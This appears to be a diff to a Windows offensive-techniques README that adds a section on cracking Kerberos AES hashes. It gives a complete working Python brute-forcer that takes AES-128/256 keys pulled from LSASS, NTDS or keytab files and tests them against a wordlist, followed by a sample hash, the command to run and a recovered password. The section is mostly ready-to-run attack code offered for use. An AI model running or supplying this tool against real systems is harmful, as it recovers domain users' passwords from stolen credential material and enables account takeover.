@@ -1894,3 +1894,87 @@ The window used to see the command output should resemble this.
 ![alt text](https://github.com/billchaison/Windows-Trix/blob/master/winrm02.png)
 
 When you are finished using the Powershell remote sessions, you can exit each window by using `Exit-PSSession;`.
+
+## >> Cracking Kerberos AES Hashes with Python
+
+Kerberos AES hashes can be found in LSASS, NTDS, keytab files, etc.  This script allows you to brute force them using a dictionary file to attempt plaintext password recovery.
+
+Create the following script named `krb-aes-crack.py`.
+
+```python
+#!/usr/bin/python3
+
+# Kerberos AES hash brute forcer.
+# Calculates aes128-cts-hmac-sha1-96 or aes256-cts-hmac-sha1-96 from plaintext strings and compares to a sample hash.
+# Kerberos AES hashes can be found in LSASS, NTDS, keytab files, etc.
+
+import sys
+import argparse
+import re
+import hashlib
+from Crypto.Cipher import AES
+
+aes128const = bytes.fromhex("6b65726265726f737b9b5b2b93132b93")
+aes256const = bytes.fromhex("6b65726265726f737b9b5b2b93132b935c9bdcdad95c9899c4cae4dee6d6cae4")
+iv = b"\0" * AES.block_size
+
+def get_hash(password, length, princ):
+   kd = hashlib.pbkdf2_hmac("sha1", bytearray(password.encode('utf-8')), bytearray(princ.encode('utf-8')), 4096, length)
+   if length == 16:
+      cipher1 = AES.new(kd, AES.MODE_CBC, iv)
+      ct1 = cipher1.encrypt(aes128const)
+      return ct1.hex()
+   elif length == 32:
+      cipher1 = AES.new(kd, AES.MODE_CBC, iv)
+      cipher2 = AES.new(kd, AES.MODE_CBC, iv)
+      ct1 = cipher1.encrypt(aes256const)
+      ct2 = cipher2.encrypt(ct1)
+      return ct1.hex()[0:32] + ct2.hex()[0:32]
+
+parser = argparse.ArgumentParser(description='Brute force Kerberos AES hashes against a wordlist.')
+parser.add_argument('hash', metavar='<hash>', type=str.lower, help="The hash to crack in hex.")
+parser.add_argument('type', metavar='<type>', type=str.lower, help="The hash type aes128 or aes256.")
+parser.add_argument('user', metavar='<type>', type=str.lower, help="The user's SAM account name.")
+parser.add_argument('domn', metavar='<type>', type=str.upper, help="The AD domain (realm).")
+parser.add_argument('dict', metavar='<dict>', type=str, help="The wordlist file.")
+args = parser.parse_args()
+
+if args.type == "aes128":
+   length = 16
+   if not re.fullmatch('^[a-f0-9]{32}$', args.hash):
+      parser.print_help()
+      sys.exit(1)
+elif args.type == "aes256":
+   length = 32
+   if not re.fullmatch('^[a-f0-9]{64}$', args.hash):
+      parser.print_help()
+      sys.exit(1)
+else:
+   parser.print_help()
+   sys.exit(1)
+
+princ = args.domn + args.user
+print("Brute forcing password...")
+
+with open(args.dict) as file:
+   for password in file:
+      password = password.rstrip('\r\n')
+      kh = get_hash(password, length, princ)
+      if kh == args.hash:
+         print("Password cracked!")
+         print(password)
+         sys.exit(0)
+print("Password not recovered.")
+sys.exit(1)
+```
+**Example of Using the Script**
+
+Assume that you have an AES-256 hash taken from a domain controller for user `joeuser` in domain `DOMAIN.TEST`.  The output might look like this.
+
+`domain.test\joeuser:aes256-cts-hmac-sha1-96:8562232c2dfc1458cc80d608deb7be53128c5a92ad8af724433e1f0daf259894`
+
+Execute the script like so:
+
+`krb-aes-crack.py 8562232c2dfc1458cc80d608deb7be53128c5a92ad8af724433e1f0daf259894 aes256 joeuser DOMAIN.TEST /my/wordlists/passwords.txt`
+
+The recovered password in this example is `Pa55w0rd`.
